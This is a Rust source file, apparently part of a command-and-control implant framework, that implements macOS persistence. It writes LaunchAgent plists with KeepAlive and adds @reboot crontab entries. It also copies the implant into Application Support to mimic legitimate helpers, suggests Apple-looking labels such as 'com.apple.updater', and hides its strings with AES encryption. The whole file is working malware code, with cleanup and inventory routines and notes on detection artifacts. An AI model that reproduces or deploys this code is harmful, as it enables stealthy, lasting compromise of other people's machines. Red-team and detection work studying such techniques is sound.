// src/agent/persistence/macos.rs
//
// macOS persistence implementations.
//
// LaunchAgent (T1543.001): Writes a property list to
// ~/Library/LaunchAgents/<label>.plist. Launchd picks it up automatically
// on next login - no exec needed for install. Immediate load is possible
// via `launchctl load <plist>` but spawns a child process, so that step
// is left to the operator if desired.
//
// Crontab (T1053.003): Same approach as the Linux implementation -
// reads existing crontab, appends an @reboot entry, and reloads via
// the `crontab` binary (the only non-root path on macOS).

#![cfg(target_os = "macos")]

use std::fs;
use std::path::PathBuf;
use std::process::Command;
use crate::strcrypt_rt;
use strcrypt::aes_str;

// ── Helpers ───────────────────────────────────────────────────────────

fn home_dir() -> Result<PathBuf, String> {
    std::env::var(aes_str!("HOME"))
        .map(PathBuf::from)
        .map_err(|_| aes_str!("HOME not set"))
}

fn launch_agents_dir() -> Result<PathBuf, String> {
    Ok(home_dir()?.join(aes_str!("Library")).join(aes_str!("LaunchAgents")))
}

fn plist_path(label: &str) -> Result<PathBuf, String> {
    Ok(launch_agents_dir()?.join(format!("{}{}", label, aes_str!(".plist"))))
}

// ── Stable drop location ──────────────────────────────────────────────
//
// Copies `source` to ~/Library/Application Support/<name>/<name>,
// mirroring the layout of legitimate macOS background helpers.
// Sets the executable bit and returns the destination path.

fn stable_drop(source: &str, name: &str) -> Result<String, String> {
    let support_dir = home_dir()?
        .join(aes_str!("Library"))
        .join(aes_str!("Application Support"))
        .join(name);
    std::fs::create_dir_all(&support_dir)
        .map_err(|e| format!("{}{}: {}", aes_str!("mkdir Application Support/"), name, e))?;

    let dst = support_dir.join(name);
    let dst_str = dst.to_string_lossy().into_owned();

    let already = std::fs::canonicalize(source)
        .ok()
        .zip(std::fs::canonicalize(&dst).ok())
        .map(|(a, b)| a == b)
        .unwrap_or(false);

    if !already {
        std::fs::copy(source, &dst)
            .map_err(|e| format!("{}: {} → {}: {}", aes_str!("stable_drop"), source, dst_str, e))?;

        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&dst, std::fs::Permissions::from_mode(0o755))
            .map_err(|e| format!("{} {}: {}", aes_str!("chmod"), dst_str, e))?;
    }

    Ok(dst_str)
}


//
// Apple plist XML format. The KeepAlive key causes launchd to restart
// the process if it exits - equivalent to Restart=on-failure in systemd.
// RunAtLoad: true fires on login. ThrottleInterval prevents a crash loop
// from hammering the system.

fn build_plist(label: &str, binary_path: &str) -> String {
    format!(
        "{}{}{}{}",
        aes_str!(r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>"#),
        label,
        aes_str!(r#"</string>
    <key>ProgramArguments</key>
    <array>
        <string>"#),
        binary_path,
        aes_str!(r#"</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>ThrottleInterval</key>
    <integer>30</integer>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
"#)
    )
}

pub fn install_launchagent(label: &str, binary_path: &str) -> Result<String, String> {
    // Derive a short name from the last component of the label (e.g. "updater" from "com.apple.updater")
    let name = label.rsplit('.').next().unwrap_or(label);
    let stable = stable_drop(binary_path, name)?;

    let dir  = launch_agents_dir()?;
    let path = plist_path(label)?;

    fs::create_dir_all(&dir)
        .map_err(|e| format!("{}: {}", aes_str!("mkdir LaunchAgents"), e))?;

    let plist = build_plist(label, &stable);
    fs::write(&path, &plist)
        .map_err(|e| format!("{}: {}", aes_str!("Write plist"), e))?;

    use std::os::unix::fs::PermissionsExt;
    fs::set_permissions(&path, fs::Permissions::from_mode(0o600))
        .map_err(|e| format!("{}: {}", aes_str!("chmod plist"), e))?;

    Ok(format!(
        "{}\n    {}  {} → {}\n    {}   {}\n    {}   {}\n    {} {}\n    {}",
        aes_str!("[+] LaunchAgent installed"),
        aes_str!("Copied:"), binary_path, stable,
        aes_str!("Label:"), label,
        aes_str!("Plist:"), path.display(),
        aes_str!("Load now: launchctl load"), path.display(),
        aes_str!("Detection: file create in ~/Library/LaunchAgents/, ESF event, Unified Log (launchd)")
    ))
}

pub fn remove_launchagent(label: &str) -> Result<String, String> {
    let path = plist_path(label)?;

    if !path.exists() {
        return Ok(format!("{}: {}", aes_str!("[~] No LaunchAgent plist found for label"), label));
    }

    // Unload first (best-effort - ignore error if not loaded)
    let _ = Command::new(aes_str!("launchctl"))
        .args([aes_str!("unload"), path.to_string_lossy().into_owned()])
        .output();

    fs::remove_file(&path)
        .map_err(|e| format!("{}: {}", aes_str!("Remove plist"), e))?;

    Ok(format!("{} '{}' {}", aes_str!("[+] LaunchAgent"), label, aes_str!("removed")))
}

// ── T1053.003 - Crontab ───────────────────────────────────────────────

pub fn install_cron(binary_path: &str) -> Result<String, String> {
    let name = std::path::Path::new(binary_path)
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| aes_str!("agent"));
    let stable = stable_drop(binary_path, &name)?;

    let current = Command::new(aes_str!("crontab"))
        .arg(aes_str!("-l"))
        .output()
        .map_err(|e| format!("{}: {}", aes_str!("crontab -l"), e))?;

    let existing = String::from_utf8_lossy(&current.stdout);

    if existing.contains(&stable) {
        return Ok(format!("{}: {}", aes_str!("[~] Cron entry already present for"), stable));
    }

    let new_content = if existing.trim().is_empty() {
        format!("{} {}\n", aes_str!("@reboot"), stable)
    } else {
        format!("{}\n{} {}\n", existing.trim_end_matches('\n'), aes_str!("@reboot"), stable)
    };

    let tmp = format!("{}{}", aes_str!("/tmp/.cron_"), std::process::id());
    fs::write(&tmp, &new_content).map_err(|e| format!("{}: {}", aes_str!("Write temp crontab"), e))?;

    let rc = Command::new(aes_str!("crontab"))
        .arg(&tmp)
        .status()
        .map_err(|e| format!("{}: {}", aes_str!("crontab <tmp>"), e))?;
    let _ = fs::remove_file(&tmp);

    if !rc.success() {
        return Err(format!("{} {}", aes_str!("crontab install exited"), rc.code().unwrap_or(-1)));
    }

    Ok(format!(
        "{}\n    {} {} → {}\n    {}  {} {}\n    {}",
        aes_str!("[+] Cron persistence installed"),
        aes_str!("Copied:"), binary_path, stable,
        aes_str!("Entry:"), aes_str!("@reboot"), stable,
        aes_str!("Detection: /usr/lib/cron/tabs/<user> write, auditd path=/var/spool/cron/crontabs")
    ))
}

pub fn remove_cron(binary_path: &str) -> Result<String, String> {
    let current = Command::new(aes_str!("crontab"))
        .arg(aes_str!("-l"))
        .output()
        .map_err(|e| format!("{}: {}", aes_str!("crontab -l"), e))?;

    let existing = String::from_utf8_lossy(&current.stdout);
    let filtered: String = existing
        .lines()
        .filter(|l| !l.contains(binary_path))
        .map(|l| format!("{l}\n"))
        .collect();

    if filtered == existing.to_string() {
        return Ok(format!("{}: {}", aes_str!("[~] No cron entry found for"), binary_path));
    }

    let tmp = format!("{}{}", aes_str!("/tmp/.cron_"), std::process::id());
    fs::write(&tmp, &filtered).map_err(|e| format!("{}: {}", aes_str!("Write temp crontab"), e))?;

    let rc = Command::new(aes_str!("crontab"))
        .arg(&tmp)
        .status()
        .map_err(|e| format!("{}: {}", aes_str!("crontab reload"), e))?;
    let _ = fs::remove_file(&tmp);

    if rc.success() {
        Ok(format!("{}: {}", aes_str!("[+] Removed cron entry for"), binary_path))
    } else {
        Err(format!("{} {}", aes_str!("crontab reload exited"), rc.code().unwrap_or(-1)))
    }
}

// ── Full cleanup (persist:cleanup / sys:die) ──────────────────────────
//
// Removes every persistence artifact this install may have created,
// keyed by the stable-drop location (~/Library/Application Support/<name>)
// rather than operator-chosen label names: any LaunchAgent plist whose
// ProgramArguments point at the stable path or the current exe is ours.
// (No macOS shell-profile persistence exists in this framework, so there
// is nothing to clean for that method.)

/// Stable-drop path for the currently running binary, computed exactly
/// the way stable_drop() does - but without copying anything.
pub fn stable_path_for_current_exe() -> Option<String> {
    let exe = std::env::current_exe().ok()?;
    let name = exe.file_name()?.to_string_lossy().into_owned();
    let dir = home_dir().ok()?
        .join(aes_str!("Library"))
        .join(aes_str!("Application Support"))
        .join(&name);
    Some(dir.join(&name).to_string_lossy().into_owned())
}

/// Map a remove_* result onto a per-method status line.
fn classify(method: &str, r: Result<String, String>) -> String {
    match r {
        Ok(m) if m.contains(aes_str!("[~]").as_str()) => format!("{}: not-present", method),
        Ok(m) => format!("{}: removed ({})", method, m),
        Err(e) => format!("{}: failed ({})", method, e),
    }
}

pub fn cleanup_all() -> String {
    let exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default();
    let stable = stable_path_for_current_exe().unwrap_or_default();

    let mut report = vec![format!(
        "{} (exe: {}, stable: {})",
        aes_str!("[*] Persistence cleanup"), exe, stable
    )];

    // ── LaunchAgent: scan ~/Library/LaunchAgents for plists referencing
    // our stable path or the current exe (catches arbitrary labels).
    let mut candidates: Vec<String> = Vec::new();
    if let Ok(dir) = launch_agents_dir() {
        if let Ok(entries) = fs::read_dir(&dir) {
            for e in entries.flatten() {
                let p = e.path();
                if !p.extension().map(|x| x == aes_str!("plist").as_str()).unwrap_or(false) {
                    continue;
                }
                if let Ok(content) = fs::read_to_string(&p) {
                    let ours = (!stable.is_empty() && content.contains(&stable))
                        || (!exe.is_empty() && content.contains(&exe));
                    if ours {
                        if let Some(stem) = p.file_stem() {
                            let label = stem.to_string_lossy().into_owned();
                            if !candidates.contains(&label) {
                                candidates.push(label);
                            }
                        }
                    }
                }
            }
        }
    }

    if candidates.is_empty() {
        report.push(format!("{}: not-present", aes_str!("launchagent")));
    } else {
        let mut removed = Vec::new();
        let mut errors = Vec::new();
        for label in &candidates {
            match remove_launchagent(label) {
                Ok(_) => removed.push(label.clone()),
                Err(e) => errors.push(format!("{label}: {e}")),
            }
        }
        if !removed.is_empty() {
            report.push(format!("{}: removed ({})", aes_str!("launchagent"), removed.join(", ")));
        } else {
            report.push(format!("{}: failed ({})", aes_str!("launchagent"), errors.join("; ")));
        }
    }

    // ── cron: entries referencing the stable path or the raw exe path.
    let mut cron_removed = false;
    let mut cron_err: Option<String> = None;
    let mut paths: Vec<&String> = Vec::new();
    for p in [&stable, &exe] {
        if !p.is_empty() && !paths.contains(&p) {
            paths.push(p);
        }
    }
    for path in paths {
        match remove_cron(path) {
            Ok(m) if m.contains(aes_str!("[+]").as_str()) => cron_removed = true,
            Ok(_) => {}
            Err(e) => cron_err = Some(e),
        }
    }
    if cron_removed {
        report.push(format!("{}: removed", aes_str!("cron")));
    } else if let Some(e) = cron_err {
        report.push(format!("{}: failed ({})", aes_str!("cron"), e));
    } else {
        report.push(format!("{}: not-present", aes_str!("cron")));
    }

    report.push(aes_str!("[+] Cleanup complete"));
    report.join("\n")
}

// ── Inventory ─────────────────────────────────────────────────────────

pub fn list() -> String {
    let mut out = Vec::new();

    // LaunchAgents
    out.push(aes_str!("=== LaunchAgents (~/Library/LaunchAgents/) ==="));
    match launch_agents_dir().and_then(|d| fs::read_dir(&d).map_err(|e| e.to_string())) {
        Ok(entries) => {
            let plists: Vec<_> = entries
                .flatten()
                .filter(|e| e.path().extension().map(|x| x == aes_str!("plist").as_str()).unwrap_or(false))
                .map(|e| format!("  {}", e.file_name().to_string_lossy()))
                .collect();
            if plists.is_empty() {
                out.push(aes_str!("  (none)"));
            } else {
                out.extend(plists);
            }
        }
        Err(e) => out.push(format!("  {}: {}", aes_str!("Error"), e)),
    }

    // Crontab
    out.push(aes_str!("\n=== Crontab ==="));
    match Command::new(aes_str!("crontab")).arg(aes_str!("-l")).output() {
        Ok(o) if o.status.success() => {
            let text = String::from_utf8_lossy(&o.stdout);
            let entries: Vec<_> = text
                .lines()
                .filter(|l| !l.trim_start().starts_with('#') && !l.trim().is_empty())
                .collect();
            if entries.is_empty() {
                out.push(aes_str!("  (empty)"));
            } else {
                out.extend(entries.iter().map(|l| format!("  {l}")));
            }
        }
        _ => out.push(aes_str!("  (no crontab)")),
    }

    out.join("\n")
}